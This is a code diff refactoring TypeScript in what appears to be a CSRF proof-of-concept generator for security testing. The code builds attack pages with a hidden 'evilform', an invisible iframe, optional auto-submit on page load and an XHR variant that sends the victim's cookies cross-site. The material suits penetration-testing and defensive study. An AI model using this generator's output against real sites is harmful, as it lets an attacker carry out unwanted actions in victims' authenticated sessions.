@@ -1,37 +1,52 @@
 interface sendfunc {
-    generate(): boolean;
+    generate(httprequest: HTTPRequest): boolean;
 
-    generateHTML(title, bodyhtml): string;
+    generateHTML(title: string, bodyhtml: string): string;
 
     send(): boolean;
 
     generateSendFunction(): string;
 }
 
-class formfunc implements sendfunc {
-    generate(): boolean {
-        return false;
-    }
+const formfunc = {
+    generate(httprequest: HTTPRequest): boolean {
+        let ezhtml: string = "";
+        const req = httprequest.line;
+        if (req === false) return false;
+        ezhtml += `<form target="dummyfrm" name="evilform" action="${req['url']}" method="${req['method']}" enctype="${req['enctype']}">
+`;
+        const params = httprequest.body;
+        for (let i = 0; i < params.length; i++) {
+            ezhtml += HTMLrender.input(URLdecode(params[i][0]), URLdecode(params[i][1]), ((!form.isAutoSubmit() && form.isSpecifiable()) ? ("text") : ("hidden"))) + "\n";
+        }
+        ezhtml += `</form>
+<iframe src="x" width="1" height="1" name="dummyfrm" style="visibility:hidden"></iframe>`;
+        setEvilHTMLcontent(ezhtml);
 
-    generateHTML(title, bodyhtml): string {
+        setEvilTextContent(ezhtml);
+        errorMsg("");
+        return true;
+    },
+
+    generateHTML(title: string, bodyhtml): string {
         let content: string =
             `${getHTMLheader(title)}
-<body${(isAutoSubmit()) ? ' onload="csrfSubmit();' : ''}>
-${bodyhtml}${(!isAutoSubmit()) ? '<button onclick="csrfSubmit();">submit</button>' : ''}
+<body${(form.isAutoSubmit()) ? ' onload="csrfSubmit();' : ''}>
+${bodyhtml}${(!form.isAutoSubmit()) ? '<button onclick="csrfSubmit();">submit</button>' : ''}
 ${this.generateSendFunction()}
 <p>${title}</p>
 ${getHTMLfooter()}
 `;
         return content;
-    }
+    },
 
     send(): boolean {
         const req = getRequest();
-        document.getElementById("stat").innerHTML += "<p>Request sent.</p><p>" + escapeHTML(req['url']) + "</p><p>" + escapeHTML(req['params']) + "</p><hr />";
+        document.getElementById("stat").innerHTML += `<p>${new Date().toLocaleString()} Request sent.</p><p>${escapeHTML(req['url'])}</p><p>${escapeHTML(req['params'])}</p><hr />`;
         const submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
         submit();
         return true;
-    }
+    },
 
     generateSendFunction(): string {
         let content = `<script>
@@ -43,65 +58,35 @@ function csrfSubmit(){
 `;
         return content;
     }
-}
-
-const forfunc = {
-    generate: function () {
-        let ezhtml: string = "";
-        const req = getRequest();
-        if (req === false) return false;
-        ezhtml += '<form target="dummyfrm" name="evilform" action="' + req['url'] + '" method="' + req['method'] + '" enctype="' + req['enctype'] + '">\n';
-        const params = req['params'];
-        for (let i = 0; i < params.length; i++) {
-            ezhtml += HTMLrender.input(URLdecode(params[i][0]), URLdecode(params[i][1]), ((!isAutoSubmit() && isSpecifiable()) ? ("text") : ("hidden"))) + "\n";
-        }
-        ezhtml += '</form>\n';
-        ezhtml += '<iframe src="x" width="1" height="1" name="dummyfrm" style="visibility:hidden"></iframe>';
-        setEvilHTMLcontent(ezhtml);
-
-        setEvilTextContent(ezhtml);
-        errorMsg("");
-        return true;
-    },
-
-    generateHTML: function (title, bodyhtml) {
-    },
-
-    send: function () {
-    },
-
-
 };
 
 const xhrfunc = {
-    generate: function () {
-        const req = getRequest();
-        if (req === false) return false;
-        let ezhtml = "";
-        ezhtml += "function csrfSubmit(){\n";
-        ezhtml += "let xhr=new XMLHttpRequest();\n";
-        ezhtml += "xhr.open('" + req['method'] + "','" + req['url'] + "');\n";
-        ezhtml += "xhr.withCredentials = true;\n";
-        ezhtml += "xhr.setRequestHeader('Content-Type','" + req['enctype'] + "'";
-        if (req['enctype'] === "multipart/form-data") ezhtml += "+'; boundary=" + req['boundary'] + "'";
-        ezhtml += ");\n";
-        ezhtml += "xhr.send('" + escapeJavascript(getParamsRaw()) + "');\n";
-        ezhtml += "}\n";
+    generate: function (httprequest: HTTPRequest) {
+        const req = httprequest.line;
+        const enctype: string = HTTPRequest.buildHeaderOption(httprequest.enctype);
+        let ezhtml: string =
+            `function csrfSubmit(){
+let xhr=new XMLHttpRequest();
+xhr.open('${req['method']}','${req['url']}');
+xhr.withCredentials = true;
+xhr.setRequestHeader('Content-Type','${enctype}');
+xhr.send('${escapeJavascript(form.getBody())}');
+}
+`;
         setEvilTextContent(ezhtml, true);
         setEvilHTMLcontent(ezhtml);
         return true;
     },
 
-    generateHTML: function (title, bodyhtml) {
-        let content = getHTMLheader(title);
-        content += '<body';
-        if (isAutoSubmit()) content += ' onload="csrfSubmit();"';
-        content += '>\n';
-        content += bodyhtml;
-        if (!isAutoSubmit()) content += '<button onclick="csrfSubmit();">submit</button>\n';
-        content += '\n<p>' + title + '</p>\n';
-        content += '</body>\n';
-        content += getHTMLfooter();
+    generateHTML: function (title: string, bodyhtml: string) {
+        let content: string =
+            `${getHTMLheader(title)}
+<body${(form.isAutoSubmit()) ? ' onload="csrfSubmit();' : ''}>
+${bodyhtml}${(!form.isAutoSubmit()) ? '<button onclick="csrfSubmit();">submit</button>' : ''}
+${this.generateSendFunction()}
+<p>${title}</p>
+${getHTMLfooter()}
+`;
         return content;
     },
 
